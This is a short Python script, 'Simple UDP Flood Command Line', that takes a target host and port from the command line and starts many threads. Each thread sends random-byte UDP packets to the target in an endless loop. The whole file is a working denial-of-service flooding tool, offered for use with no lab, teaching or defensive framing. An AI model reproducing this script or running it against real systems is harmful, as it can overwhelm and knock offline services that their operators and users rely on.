# Simple UDP Flood Command Line
# -*- coding: utf-8 -*-
import os, sys
import threading
import random
import socket

def attack():
  pkt = random._urandom(psize)
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      s.sendto(pkt, (ip,port))
      print("Sending "+str(len(pkt))+" to => "+ip+":"+str(port))
      for y in range(conn):
        s.sendto(pkt, (ip,port))
    except:
      s.close()

print("""
  Simple UDP Flood Command Line
""")
ip = str(sys.argv[1])
ip = socket.gethostbyname(ip)
port = int(sys.argv[2])
threads = int(sys.argv[3])
conn = int(sys.argv[4])
psize = int(sys.argv[5])
for x in range(threads):
  t = threading.Thread(target=attack)
  t.start()
